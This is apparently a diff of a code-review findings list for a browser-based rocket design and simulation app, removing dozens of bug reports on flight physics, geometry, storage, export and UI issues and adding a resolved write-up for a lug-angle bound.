-- **C9** (MED, CONFIRMED BY REVIEWER) `web/src/services/flight/recoverySizing.ts:97-102 (consumer components/tools/ParachuteTool.tsx:41)`. airDensity's custom branch fills a blank pressure with sea-level 101325 Pa. That mirrors the bridge's ExtendedISAModel(launchAltitude, T, STANDARD_PRESSURE, ...) and is correct for RecoverySizingReadout, which sizes for a flight. The standalone Parachute tool also calls it with `{ launchAltitudeM: siteM, temperatureC }` and has no pressure field, yet labels the result "Air at the site" and models no flight. | At a 2,682 m field, leaving temperature blank gives about 0.95 kg/m^3. Typing the ISA temperature (15 C) jumps to 1.225 kg/m^3, which is 29% denser. Descent rate drops about 12% and the recommended canopy comes out too small. No test covers ParachuteTool density. *Why it matters:* Give ParachuteTool a site-physical density: ISA pressure at siteM with the typed temperature. Alternatively add an option to airDensity, e.g. `fillBlanks: 'flight' *Fix:* 'site'`, and test both. |.
-- **C10** (MED, REPORTED) `web/src/services/flight/flightEvents.ts:187`. forwardFlightEnd stops at the first EJECTION_CHARGE. BasicEventSimulationEngine queues a booster's 0-delay charge in the sustainer branch at booster burnout. *Why it matters:* Max q·alpha on two-stage designs leaves out the sustainer burn. *Fix:* Match RECOVERY_DEVICE_DEPLOYMENT, or only accept a charge at or after apogee. Add a two-stage test.
-- **C11** (MED, REPORTED) `web/src/services/flight/safetyLimits.ts:76,97 (also windProfileCsv.ts:127, ork/importLaunch.ts:103,130)`. The wind gate checks the signed speed. Negative CSV or .ork wind speeds pass it, and the kernel flies abs(speed) from the reversed heading (PinkNoiseWindModel.setAverage). *Why it matters:* A -40 m/s wind passes the 20 mph refusal. windSweep also draws headings 180 degrees off. *Fix:* Use Math.abs, or reject or normalize negative speeds on import.
-- **C12** (MED, REPORTED) `web/src/services/flight/simulations.ts:371`. "Launch into wind" with multilevel wind aims the rod by the lowest level's direction. Upstream SimulationOptions.getLaunchRodDirection uses the wind interpolated at the pad altitude. The safety check and sweep center use the same wrong level. *Why it matters:* An MSL sounding starting below a high field aims and judges by sea-level wind. *Fix:* Add one helper that interpolates at the pad altitude, and test it against the Java.
-- **C13** (MED, REPORTED) `web/src/services/flight/forecastHours.ts:71-84`. flyForecastHours never calls launchLimitViolations. *Why it matters:* Hours over the wind code are flown and included in the landing spread ellipse, unlike runPlan and windSweep. *Fix:* Skip or flag hours that fail the limits.
-- **C14** (MED, CONFIRMED BY REVIEWER) `web/src/services/flight/recoveryFlown.ts:72`. The descent rate is read at the next RECOVERY_DEVICE_DEPLOYMENT or GROUND_HIT, even when that deployment happens at the same instant. When two devices open together (two chutes on the ejection charge, which is common on heavier low-power models, or two devices both set to apogee), the first device's phase "ends" at its own opening time. The reported rate is then the speed near apogee or ejection, not the settled descent. *Why it matters:* The Recovery readout shows a wrong descent speed for one of the chutes, after a run whose results are supposed to replace the estimate. *Fix:* Only count end events with `time > opened.time` (or skip deployments at the same time). Add a test with two simultaneous deployments.
-- **C15** (MED, CONFIRMED BY REVIEWER) `web/src/services/design/discGeometry.ts:56-60 (used by autoRadius.ts:93-99)`. An auto ring, bulkhead, coupler or engine block inside a transition is sized to `max(fore, aft) - thickness`, and inside a nose cone to `aftRadius - thickness`, wherever it sits. The kernel takes `min(parent.getInnerRadius(pos1), parent.getInnerRadius(pos2))` at the part's own fore and aft faces (Java: RadiusRingComponent.getOuterRadius and ThicknessRingComponent.getOuterRadius). *Why it matters:* A bulkhead or coupler partway up a nose cone (avionics bay or nose weight) is flown at the narrow local bore but drawn, meshed and DXF/STL-cut at the base bore, so the cut part does not fit. *Fix:* Resolve the parent's inner radius at the child's axial span with the shapeProfile station radius minus the wall, and take the min of the two ends. |.
-- **C16** (MED, CONFIRMED BY REVIEWER) `web/src/services/design/discGeometry.ts:74-79 (used at :140 and autoRadius.ts:97-100)`. A centering ring's automatic bore uses `mountBore`: the first `innertube` sibling's outer radius, whether or not it overlaps the ring along the axis, and not clamped. The kernel takes the maximum outer radius over the InnerTube siblings whose span overlaps the ring, 0 if none does, then clamps to the ring's outer radius (CenteringRing.java:22-48). *Why it matters:* Examples: a ring forward of the motor mount (a stop ring, or a ring around a payload or altimeter tube while a second inner tube sits elsewhere), or a body with two inner tubes. The kernel flies a solid disc or the larger bore; the app draws and cuts a ring bored to the first mount. *Fix:* Port the overlap test and the max/clamp.
-- **C17** (MED, CONFIRMED BY REVIEWER) `web/src/services/design/treeEdit.ts:580-593`. New body tubes and transitions get fixed radii (0.013, or 0.013/0.019) with no auto flag. Desktop's `BodyTube()` sets `autoRadius = true` and `Transition()` sets both `autoForeRadius` and `autoAftRadius` (BodyTube.java:40-43, Transition.java:43-50). The comment at treeEdit.ts:652-662 uses exactly that constructor argument for rings and couplers. *Why it matters:* A body tube added behind a 54 mm nose arrives at 26 mm and stays there, which is the "wrong rocket that simulates quietly" the rings comment warns about. *Fix:* Seed `outerRadiusAuto: true` and `foreRadiusAuto`/`aftRadiusAuto: true`, as the ring cases do. |.
-- **C18** (MED, REPORTED) `web/src/services/design/componentActions.ts:50-54,135-146,176-189; clipboard.ts:64`. `reid` gives every copied subtree fresh UUIDs. Flight-config motors are keyed by mount id, and `commitTree` only reconciles (store.ts:829); it never copies assignments. Splitting a 4-tube cluster leaves one tube with its motor. Splitting a pod set or parallel stage with a mount inside, or duplicating or pasting a mount, drops the motors on every copy, including the first copy's children. Desktop copy() carries the MotorConfigurationSet (RocketComponent.splitInstances, InnerTube.makeIndividualClusterComponent). *Why it matters:* The split looks like the desktop's but silently unloads boosters and cluster tubes. *Fix:* Return an old-id to new-id map from `reid` and copy each config's motor entries to the new mount ids. |.
-- **C19** (MED, CONFIRMED BY REVIEWER) `web/src/state/useWorkspaceEffects.ts:181-194 (with services/storage/workspaceStore.ts:375-382 and :196-203)`. The unload/hidden flush calls `saveSync` without checking for a conflict. It does this even when this tab's async saves are being refused with `conflict` (another tab has moved the design on). The journal is stamped `t: Date.now()`. On the next `load()`, `meta.updatedAt > journal.t` is false, so the stale tab's journal is replayed over the newer library entry. *Why it matters:* This loses data in exactly the two-tab case the conflict guard exists for. Tab A shows the "another tab moved on" banner, the user closes A, then reloads B or opens a new tab, and B's work is replaced by A's stale design. *Fix:* Skip `saveSync` (and the `onHidden` async save) while `storageWarningKind === 'conflict'`. Better, have `LibraryWorkspaceStore` remember the refusal and refuse `saveSync` too.
-- **C20** (MED, CONFIRMED BY REVIEWER) `web/src/state/store.ts:1307-1309,1389-1392 (caller components/report/ExportDialog.tsx:173-178)`. `runSims` can be re-entered. A second call overwrites `batchAbort`, and only the latest batch's `finally` clears `simBusy`. ExportDialog's "update sim data" calls `runSim` with no `simBusy` check. *Why it matters:* Start a batch and then export a PDF with update ticked. Cancel can no longer reach the first batch. `simBusy` goes false while its flights are still in the air, so Run re-enables, auto-run and the hidden-tab update reload see "idle", and the first batch's late landing still switches the view to Results. *Fix:* In `runSims`, refuse or join while a batch is running, or abort the previous batch before replacing `batchAbort`. Alternatively make `simBusy` a counter.
-- **C21** (MED, CONFIRMED BY REVIEWER) `web/src/state/store.ts:1358-1371 (consumer components/report/ExportDialog.tsx:176-189)`. `runSims`/`runSim` never reject. Failures, timeouts, design blockers and refusals all resolve and only write `err`. ExportDialog's `catch` ("Reported, not swallowed: swallowing writes the PDF with the previous run's numbers") can therefore never fire. *Why it matters:* A PDF export with "update sim data" ticked, on a design whose flight times out or is refused, writes the PDF with the previous run's numbers or none, unmarked. That is the outcome its comment says it prevents. *Fix:* Have `runSims` return a per-id outcome (landed / failed / skipped / canceled), and have ExportDialog stop unless the active row landed.
-- **C22** (MED, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:371`. `saveDesignAs` passes `workspaceSnapshot(s)` straight to `DesignLibrary.create`. That snapshot includes every flight `result` (store.ts:671-684). `create` and `write` (designLibrary.ts:193-195,164-165) store it as-is under the design key. Every other path goes through `workspaceStore.save`, which strips results first (`lean`) and writes them under the results key. *Why it matters:* Save As on a workspace with flights writes megabytes of results into the design blob. Under the 5 MB localStorage fallback this fails with a misleading "storage full", and every later read of that entry parses the flights. *Fix:* Lean the snapshot, or route Save As through a workspace-store method that leans it and writes results under the new id.
-- **C23** (MED, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:353-355 (with useWorkspaceEffects.ts:59-69,128-160 and workspaceStore.ts:357-364)`. `skipNextSave` is set only for the boot hydrate. `openDesign`'s `hydrate` triggers the 500 ms autosave, which re-stamps `updatedAt`. Because `setActiveId` resets `savedResults`, it also rewrites the whole results blob. *Why it matters:* Merely opening a library design moves it to the top of the "most recently updated" list and rewrites its flights. This is the exact behavior the `skipNextSave` comment says must not happen. With `lastSeenAt` reset to null, that write also skips the conflict check. *Fix:* Expose a "quiet replace" token from the store (bumped by `openDesign`/`hydrate`) that the autosave effect consumes, instead of the boot-only ref.
-- **C24** (MED, CONFIRMED BY REVIEWER) `web/src/components/layout/UpdateToast.tsx:210`. The hidden-tab auto-apply passes only `simBusy` as "busy". `runDriftSweep` never sets `simBusy` (store.ts:1498, it uses `driftSweepRun`). The open confirm/prompt dialogs of an import in progress (`homeForImport`) are not considered either. *Why it matters:* A tab left hidden for 30 s mid drift sweep, or with the import name-clash dialog open, reloads. The sweep is lost, or the import is silently abandoned. This breaks the stated rule "only once doing it cannot interrupt anything". *Fix:* Pass `simBusy \|\| driftSweepRun !== null \|\| confirm/prompt request open`.
-- **C25** (MED, CONFIRMED BY REVIEWER) `web/src/state/store.ts:1107-1121 (UI components/config/SeparationSection.tsx:67-72)`. When asked to ground the last flying stage, `setStageFlies` returns the config unchanged with no message. It has already called `recordStep()`. The comment says "refusing here says so where the user can see it", but nothing says anything. *Why it matters:* The checkbox stays enabled. Unticking it does nothing (an inert control), and Undo gains an entry that changes nothing and clears redo. `setMountMotor` (1073-1076) also records its step before `patchConfig` can no-op on an unknown config. *Fix:* Disable the checkbox for the only flying stage, with a title giving the reason, or set `err`. Move `recordStep` after the change check, as `deleteConfig` does.
-- **C26** (MED, CONFIRMED BY REVIEWER) `web/src/state/store.ts:859-877 (with fileSlice.ts:422-431, components/canvas/LoadedBanner.tsx:58-59)`. `replaceWorkspace`'s transient reset omits `repairNotes`, and `resetWorkspace` does not set it either. *Why it matters:* Open a file whose values were clamped, then File > New. The blank default design shows the notes card listing repairs made to the previous file. *Fix:* Add `repairNotes: []` to the `replaceWorkspace` transient block. `hydrate` and `openOrkFile` already override it.
-- **C27** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/DimensionFields.tsx:385-389 (with services/design/componentFields.ts:445,456,465)`. The `angle` field kind sets min -180 deg and no max, and fin `cant` uses it, so 40 deg of cant is accepted, stored, written to .ork/.rkt and drawn in the marking guide (services/report/markingGuide.ts:232). The kernel clamps cant to +/-15 deg (FinSet.java:42 MAX_CANT_RADIANS, setCantAngle :244), and the desktop spinner stops there. *Why it matters:* The app shows and exports a cant the kernel never flies, and the printed marking guide uses the wrong angle. *Fix:* Give the angle kind a per-field max/min, and give cant +/-MAX_CANT (15 deg) the way shapeParameter gets shapeParamMax. |.
-- **C28** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/FreeformFinEditor.tsx:67-68,104-108,136-143`. Any vertex can be dragged, nudged or deleted, including the first (root leading edge) and the last (root trailing edge). The desktop forbids this: FreeformFinSet.removePoint throws for index 0 and the last index, setPoint keeps the first point at the origin, and clampLastPoint keeps the last point on the body. ComponentFactory -> setPoints (FreeformFinSet.java:272-300) translates the whole outline so the first point sits at the origin. *Why it matters:* Dragging point 1 off (0,0) gives an outline the editor, 3D view and mass code draw in one place and the kernel flies shifted. Deleting the last point leaves a root edge in the air, which the desktop cannot produce. *Fix:* Pin point 0 to (0,0), lock the last point's y to 0, and disable delete (button, Delete/Backspace) for the first and last indices. |.
-- **C29** (MED, CONFIRMED BY REVIEWER) `web/src/components/common/ColorInput.tsx:118-126,133`. The native `change` listener is attached once (effect deps []) to `ref.current`, but the input carries `key={value}`, so every commit remounts a new `<input>` that has no listener. Only `onBlur` commits after the first change. *Why it matters:* The second and later color picks commit only when focus leaves. The component's own comment says closing the OS picker does not always move focus, so part, phase and template colors silently do not save. *Fix:* Drop `key={value}` and sync `el.value` in a layout effect, or re-run the listener effect keyed on `value`. |.
-- **C30** (MED, CONFIRMED BY REVIEWER) `web/src/components/layout/useHelpFrame.ts:344-349`. The help frame is forced to `data-theme="dark"` with the comment "The app has no light mode", but services/app/theme.ts:16 offers dark/light/system/daylight and a11y.spec tests all three themes. *Why it matters:* In the light or daylight theme (daylight exists for outdoor readability), Help renders as a dark page inside a light dialog. The comment states a constraint that is false. *Fix:* Map the app's resolved theme to Docusaurus `data-theme` (light/dark) and fix the comment. |.
-- **C31** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/flightScene.ts:74 (with FlightGroundMap.tsx:67-69,108-109,161)`. The 3D flight scene puts east on +x, up on +y and north on +z (`new THREE.Vector3(Px*s, alt*s, Py*s)`). Kernel Px is east and Py is north (FlightDataType TYPE_POSITION_X/Y, and groundTrack.ts:49-50 reads them that way). East x North = -Up in three.js's right-handed frame, so this basis is left-handed and the whole scene is drawn as a mirror image. Worked check: from the default camera at (34,22,34) the screen-right vector is (1,0,-1), which is southeast, while the view looks southwest; a real observer facing southwest has northwest on their right. The ground tiles are flipped to match the arc (flipY=false), so street-layer labels render reversed and a northeast drift shows with the wrong handedness. Tile and arc agree with each other, so the existing FlightGroundMap test cannot catch it *Why it matters:* The 3D path disagrees with the 2D ground track (PlanView: north up, east right) and with the real field *Fix:* Map north to -z (z = -Py*s, north = -(...) in groundMapLayout), keep the default flipY, and add a handedness assertion to the test |.
-- **C32** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/FlightPathExport.tsx:46-50 (with CenterCanvas.tsx:147-157, useResultFlight.ts:37)`. The 3D path view animates `pathResult`, which is the flight chosen in the Results picker (`resultSimId`). The "Export flight path" button overlaid on that view reads `selectActive(s).result`, `.launch` and `.name` instead. Failure: pick sim B in the Results picker while sim A is active. The animation shows B, the export writes A's KML/GPX under A's name, and if A has no result the button disappears while B is on screen *Why it matters:* The user downloads a different flight from the one in front of them *Fix:* Pass the shown ResultFlight (id, result, launch, name) into FlightPathExport from CenterCanvas rather than reading the active sim |.
-- **C33** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/Rocket3D.tsx:140 (with useRocketExport.ts:187,208)`. `onPick={snapshot}` hands an async function to a void-typed prop. eslint sets `checksVoidReturn.attributes:false`, so lint does not flag it. `snapshotWithHeader` or the encode can reject (an 8K encode, a canvas that is too large, a lost context) and nothing catches it. TreeSchematic takes an `onError` for exactly this reason (its comment at line 82 says an unreported rejection "leaves the button doing nothing"), but Rocket3D has no error channel *Why it matters:* A failed 3D image export is an unhandled rejection and the user sees nothing *Fix:* Wrap the handler in try/catch and add an `onError` prop wired to `setErr`, as TreeSchematic does |.
-- **C34** (MED, CONFIRMED BY REVIEWER) `web/src/services/files/ork/exportSimulation.ts:113-116 and ork/importLaunch.ts:54-61`. Constant gravity is written and read as `<gravitymodel>Constant</gravitymodel><constantgravity>`. Desktop writes `<gravity model="constant"><value>g</value></gravity>` (OpenRocketSaver.saveSimulation lines 402-410). Desktop reads only `<gravity model>` (SimulationConditionsHandler line 49, GravityHandler.storeSettings), all in engine-java/.openrocket-src at the current pin. *Why it matters:* Constant gravity set here opens on the desktop as WGS. A desktop file's constant gravity is not read here, and it is dropped on save (it is inside `<conditions>`, so passthrough does not carry it). The only test (simOptionsExtras.test.ts:112) round-trips our own spelling, so it passes. *Fix:* Write and read `<gravity model="wgs|constant"><value>`, keep reading the old spelling for files this app wrote, and pin the test against the desktop element.
-- **C35** (MED, CONFIRMED BY REVIEWER) `web/src/services/files/ork/exportWriters.ts:450-477 (stageXml) and ork/importReaders.ts:512-536 (readStages)`. Stages bypass `readCommon` and `header()`. A stage's `<comment>` is not read or written, and its `<appearance>`, `<color>` and `<linestyle>` are not carried, because stages get no `readPassthrough`. FIELDS gives every type, stage included, the COMMENT field (componentFields.ts:667), so the panel offers a stage comment. Desktop's AxialStageSaver goes through RocketComponentSaver.addParams, which writes all of these. *Why it matters:* A comment the user types on a stage is lost on the next .ork save, with no message. Stage appearances from a desktop file are dropped, yet `archiveNotes` (orkImport.ts:164) counts them and says "They are preserved, so a save keeps them". *Fix:* Read the stage's comment and passthrough in `readStages` and emit them in `stageXml`, or route the stage through `readCommon`/`header`. Add a stage-comment round-trip test.
-- **C36** (MED, CONFIRMED BY REVIEWER) `web/src/services/files/rktExport.ts:127-133`. When a part overrides CG only, `writeCommon` writes `<KnownMass>` as `g(overrideMass ?? 0)` = 0 and sets `UseKnownCG` to 1. RockSim's one switch overrides mass and CG together (BaseHandler.setOverride; our reader at rktImport.ts:240-244 does the same). Desktop's BasePartDTO constructor writes `ec.getMass()`, the real mass, not 0. *Why it matters:* A CG-only override exported to .rkt reopens in RockSim, desktop OpenRocket or this app as a part with an override mass of 0, and the rocket's mass, CG and stability shift. *Fix:* When only CG is overridden, write the part's mass. The app does not compute mass, so either take it from the kernel figure or leave `UseKnownCG` off and report the CG override as not exported.
-- **C37** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/OverridesSection.tsx:71`. `OverrideRow` passes `onChange={(v) => onValue(v ?? 0)}`, so a cleared box reaches `onValue` as 0, not null. The `si !== null` guards in the mass and CG handlers (lines ~153, ~172) never run, and CD has no guard at all. *Why it matters:* Select-all and retype on a mass, CG or CD override writes `overrideMass: 0` (or CG 0, CD 0) on every keystroke into the live build. Blurring the empty box keeps the 0. With "apply to all subcomponents" on a stage, the kernel flies a 0 kg stage. This is the cleared-box failure the earlier audit fixed for the delay boxes. *Fix:* Pass `onChange={onValue}` with `onValue: (v: number \| null)`, and drop null in each handler (`si !== null && ...`; CD `v !== null && ...`).
-- **C38** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/ScaleDialog.tsx:127-134 (also design/FreeformFinActions.tsx:76-80)`. The scale factor has `min` only. `scaleNode` computes `round(mass * k ** 3, 15)` and `round(v * k)` (tree/scaleRocket.ts:218,245) through `roundTo`, which multiplies by 10^places. *Why it matters:* A factor of about 1e98 or more (a mistyped exponent, which `parseEntry` accepts as finite) stores `mass = Infinity`, and about 1e296 or more stores Infinity lengths. That breaks the "finite after every conversion" rule `entryValue.ts` states, and the bad values reach the mesh, the `.ork` writer and the kernel. *Fix:* Add a `max` to both factor inputs (for example 1000), and have `scaleRocket`/`scaleNode` refuse a result that is not finite.
-### Low
+**C3. MED, FIXED | Lug and rail button angle has no upper bound** | `web/src/components/design/DimensionFields.tsx:496-504` | VERIFIED
+Resolution: a lug's and a rail button's angle stops at 180 deg in the panel
+(`fieldRange`), as the desktop spinner does, because their kernel setters
+clamp instead of wrapping. The read-back test sends the panel's limits to the
+kernel, and its C3 entries are gone. On import, a `.ork` angle past 180 deg is
+clamped, as desktop's loader clamps it through the same setters
+(`readAngleAroundBody`), and a RockSim one is wrapped (`wrapMountAngles`),
+since that reader converts degrees on purpose to keep the part where RockSim
+drew it. Pinned by `orkFieldRoundTrip.test.ts` and `rktImport.test.ts`.
+The finding as reported:
+The `angle` case passes a lower bound of -180 degrees and no upper bound. A
+typed 270 degrees is stored as 4.712 rad, drawn at 270 (`rollAngleOf` in
+`tree/componentKinds.ts`), and written as `<angleoffset>270</angleoffset>`
+(`exportWriters.ts:296`). `LaunchLug.setAngleOffset` (`LaunchLug.java:113`)
+and `RailButton.setAngleOffset` (`RailButton.java:235`) clamp to [-pi, pi]
+instead of wrapping, so the kernel and desktop both fly 180. Other angle
+setters use `reducePi` and are unaffected.
+Fix: pass `Math.PI` as the upper bound, as the desktop spinner stops at 180.
 
-- **C39** (LOW, CONFIRMED BY REVIEWER) `web/src/components/design/PropertyPanel.tsx:203`. title=`${catalogPart.manufacturer} ${catalogPart.partNo}`, where both fields are optional and come from an imported .ork preset. *Why it matters:* The tooltip shows "undefined 12345" for a preset with no manufacturer. *Fix:* Use [manufacturer, partNo].filter(Boolean).join(' '). |.
-- **C40** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/GroundTrack.tsx:317-320`. `drawn` is `lines` filtered to those with 2 or more points (line 76), but the region is found by `r.branch === i`, where `i` is the index into `drawn`. `branch` indexes `lines` (regionColor on line 120 uses `lines[branch]`) *Why it matters:* If an earlier stage's track has fewer than 2 points, each later stage's readout shows another stage's swept spread *Fix:* Use `lines.indexOf(l)` (or carry the branch index on the line) instead of the map index |.
-- **C41** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/StabilityBadge.tsx:51,163 and InfoOverlay.tsx:18,251`. `stabilityState(cal) ?? 'under'` turns an uncomputable margin (non-finite calibers) into the danger tone and a ⚠ glyph. `stabilityVerdictKey(NaN)` falls through every comparison and returns 'stability.unstable' *Why it matters:* A design with no computable margin is labeled "Unstable" in red, while the 2D overlay (`marginText` returns null) shows nothing. The views disagree, and the badge states something the kernel never said *Fix:* Render a neutral ", " verdict and tone when `!Number.isFinite(cal)` |.
-- **C42** (LOW, REPORTED) `web/src/components/canvas/SchematicOverlay.tsx:52-53`. The 2D CG/CP markers are drawn without an `info.cg/cp` finiteness check. Rocket3D.tsx:229,240 does guard with Number.isFinite, and its comment acknowledges non-finite values *Why it matters:* A NaN CP writes `cx="NaN"` circles and leader lines (console errors, stray geometry) *Fix:* Gate cgX/cpX on Number.isFinite |.
-- **C43** (LOW, CONFIRMED BY REVIEWER) `web/src/services/report/reportGeometry.ts:217-218, web/src/services/exports/solidMesh.ts:466-467 (same literals in report/templatesSection.ts:35, components/canvas/rocketPieces.ts:455-456, schematicShapes.tsx:818-819)`. A transition with no foreRadius/aftRadius falls back to invented 0.012/0.009 literals. ComponentFactory "transition" treats an absent radius as automatic (setForeRadiusAutomatic/setAftRadiusAutomatic), and KERNEL_DEFAULTS.transition deliberately has no radii. These five copies are untracked by the kernelDefaults table. *Why it matters:* A truncated or hand-edited node draws and exports at 24/18 mm while the kernel flies the neighbor's radius. *Fix:* Resolve through autoRadius's facing-radius rule, or one shared helper, instead of literals. |.
-- **C44** (LOW, CONFIRMED BY REVIEWER) `web/src/tree/assembly.ts:248-253, 262-267`. The pod's bounding radius uses chainOuterRadius, which includes a nose cone's aftRadius. Kernel ComponentAssembly.getBoundingRadius counts only BodyTube and Transition children. Also, RadiusMethod.RELATIVE adds the parent radius only when the parent is a BodyTube, while resolveAssemblyRadius always adds it. *Why it matters:* A pod whose widest member is its nose cone is drawn further out than flown. Today canHost only allows pods on body tubes, so the second half is reachable only from an imported stage-level pod (reportGeometry.ts:230-232 then uses chainMaxR where the kernel adds 0). *Fix:* Mirror getBoundingRadius (tube and transition only), and add the parent radius only for a bodytube parent. |.
-- **C45** (LOW, CONFIRMED BY REVIEWER) `web/src/services/report/reportModel.ts:91-94`. PartRow reads only `outerRadius`/`innerRadius`/`thickness`. The PDF parts table (partsSection.ts:33) and the report CSV therefore show no diameter for nose cones and transitions, which carry aftRadius/foreRadius. Body tubes show no inner diameter (they carry thickness, not innerRadius), and fins show no root or span. *Why it matters:* The parts list in the PDF and CSV is missing the main dimension of the airframe's nose and transitions. *Fix:* Map per type: base diameter for a nose cone, fore and aft diameters for a transition, bore = outer − 2·thickness for tubes. |.
-- **C46** (LOW, CONFIRMED BY REVIEWER) `web/src/tree/position.ts:223-226 and web/src/tree/scaleRocket.ts:340`. resolveFilePositions and rocketLength read a chain member's length as `num(n,'length',0)` / `numOpt ?? 0`. axialChain consumers (reportGeometry, schematicGeometry) use partLength, which falls back to the kernel's per-type length. *Why it matters:* A chain member with no length key is laid out at 0 length when absolute/after positions are resolved, but drawn at the kernel length (0.07/0.3/0.05 m). Every child's resolved offset then shifts by that amount. *Fix:* Use partLength in both places.
-- **C47** (LOW, CONFIRMED BY REVIEWER) `web/src/services/flight/interpolate.ts:16-41`. lerpAt with x = NaN skips both clamps, binary-searches to n−1 and returns NaN rather than the documented `number | null`. *Why it matters:* A NaN hover or target x reaches a readout as "NaN" instead of the empty state. *Fix:* Return null when `!Number.isFinite(x)`. |.
-- **C48** (LOW, REPORTED) `web/src/services/flight/flightConfigs.ts:379-396,407-416`. loadoutSignature ignores the deployment, separation and grounded overrides, so addSim can join a configuration that carries them.
-- **C49** (LOW, REPORTED) `web/src/services/flight/simulations.ts:124,144 with recoveryFlown.ts:65`. flightKey ignores names, but deviceDescent matches kernel events by the device's current name. After a rename, the readout silently falls back to the app estimate while still showing as up to date.
-- **C50** (LOW, REPORTED) `web/src/services/flight/flightColumns.ts:70-131 and :43`. The bridge emits `Fta` in full mode, but the table has no entry for it, so it exports unlabeled in N. The `Ft` and `α` rows can never appear. The `mass` column is hard-coded to g while `mp` follows the user's unit preference.
-- **C51** (LOW, REPORTED) `web/src/services/flight/windSweep.ts:194-199`. With speedMin == speedMax (both clamped to the ceiling), the sweep flies each heading N identical times. That wastes runs and skews the driftEllipse covariance. *Why it matters:* Fix: collapse speedSteps to 1.
-- **C52** (LOW, REPORTED) `web/src/services/design/autoShoulder.ts:34; autoRadius.ts:31,57-61`. A flipped nose cone (tail cone) has its base at the fore end (NoseCone.getBaseRadius, isBaseRadiusAutomatic), but the shoulder always follows `index + 1` and `facingRadius` lends a nose radius only at 'aft'. *Why it matters:* A tail cone's auto shoulder never follows the tube it plugs into, and an auto tube ahead of a tail cone cannot follow its base. *Fix:* Flip the side and the facing end when `flipped === true`. |.
-- **C53** (LOW, CONFIRMED BY REVIEWER) `web/src/services/design/discGeometry.ts:48-50`. `tubeRadii` ignores `filled`; BodyTube.getInnerRadius returns 0 when filled. *Why it matters:* An auto ring or auto-radius mass object inside a filled tube is drawn with a bore the kernel does not give it. *Fix:* Return innerR 0 when `filled === true`. |.
-- **C54** (LOW, CONFIRMED BY REVIEWER) `web/src/services/design/derivedFields.ts:157-159`. The doc comment says typing a density into a part with no packed volume "is refused rather than writing a mass of 0". The code writes `{mass: 0}` (density × 0 is finite), and derivedFields.test.ts:107-110 pins that. MassComponent.setDensity also writes 0, so the code is kernel-faithful. *Why it matters:* A point mass (length 0 is allowed per requiredComponent.ts:21) has its mass wiped by a density entry, and the comment says it cannot happen. *Fix:* Fix the comment, or refuse when `packedVolume` is 0 and update the test. |.
-- **C55** (LOW, CONFIRMED BY REVIEWER) `web/src/state/useWorkspaceEffects.ts:249-251`. One `err` slot carries both build status and action failures, and every successful rebuild calls `setErr(null)`. *Why it matters:* On a slow link the engine arrives after the user's import failed or an export reported skipped parts, and the rebuild wipes that message before it is read. A debounced rebuild landing within 150 ms of a run error does the same. *Fix:* Split it into a `buildErr` that the rebuild owns and an `err` for actions.
-- **C56** (LOW, CONFIRMED BY REVIEWER) `web/src/state/store.ts:540-541,851-877,786-801`. `selectedConfigId` is reset neither by `replaceWorkspace` nor by `restore`. `configFor` falls back to `configs[0]` (flightConfigs.ts:147-149), not to the active simulation's configuration. *Why it matters:* After opening another design, or undoing `addConfig`, the Configurations tab shows the first configuration instead of following the active simulation, which the selector's own documentation promises. *Fix:* Reset `selectedConfigId: null` in `replaceWorkspace`. In `selectEditedConfig`, fall back to the active sim's config when the id is not found.
-- **C57** (LOW, REPORTED) `web/src/state/store.ts:927-948 (boot call useWorkspaceEffects.ts:84)`. `hydrate` does not call `clearHistory`. Only `openDesign` does, before calling it. *Why it matters:* Edits made to the default rocket before the boot `load()` resolves stay on the undo stack. Undo after hydration puts the default tree back, and the autosave then writes it over the stored design. *Fix:* Call `clearHistory()` inside `hydrate`.
-- **C58** (LOW, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:413-431`. `resetWorkspace` swaps the tree, so the autosave creates a library entry for the untouched default rocket 500 ms after New, or after deleting the open design. A fresh boot with nothing saved creates none until the first edit. *Why it matters:* Each New followed by an Open leaves an unedited "Rocket" row in File > Open. *Fix:* Use the same quiet-replace token as the `openDesign` finding.
-- **C59** (LOW, CONFIRMED BY REVIEWER) `web/src/state/store.ts:1063-1068`. `redo` does not `commitEdit()` first, while `undo` does. `useUndoShortcuts.ts:7` claims both actions flush any in-flight edit. *Why it matters:* With a transaction open (an action that called `beginEdit` without a commit), redo overwrites the in-progress edit. The later commit then pushes a stale snapshot and clears `future`. *Fix:* Call `commitEdit()` at the top of `redo`.
-- **C60** (LOW, CONFIRMED BY REVIEWER) `web/src/state/fileSlice.ts:497-503`. `saveOrk` takes its "one vintage" snapshot before the awaits. The opt-in `<designinfo>` then comes from `assembleReport()`, which reads the live store (reportModel.ts:165-167) after the catalog fetch. *Why it matters:* An edit during the save writes pre-edit geometry with post-edit derived statistics. With `info` null (just after a load), the opted-in block is silently omitted. *Fix:* Pass the snapshot to `assembleReport`, or build `designInfo` before the first await.
-- **C61** (LOW, REPORTED) `web/src/services/app/swBuild.ts:246-249`. `isNewerBuild(waiting, null)` treats an active worker that does not answer within 3 s as pre-feature, so any waiting worker that answers counts as newer. *Why it matters:* A current active worker that is slow to wake, combined with a stale previous build in the waiting slot (the CDN case this file exists for), brings back the downgrade loop. *Fix:* Retry the active worker once, or treat a non-answer as pre-feature only if the active script URL predates the feature.
-- **C62** (LOW, REPORTED) `web/src/components/sim/WeatherDialog.tsx:118-123`. Under React.StrictMode (main.tsx:32), the refresh fetch starts in the mount effect, then the simulated unmount runs useLatest's cleanup, which aborts it. `started.current` survives the remount, so nothing refetches and state stays 'loading'. *Why it matters:* In dev, opening Weather via Refresh shows "Fetching" forever. The comment claims the ref handles the strict-mode double mount. *Fix:* Clear `started.current` in the effect's cleanup, or start the fetch from the Refresh click rather than an effect. |.
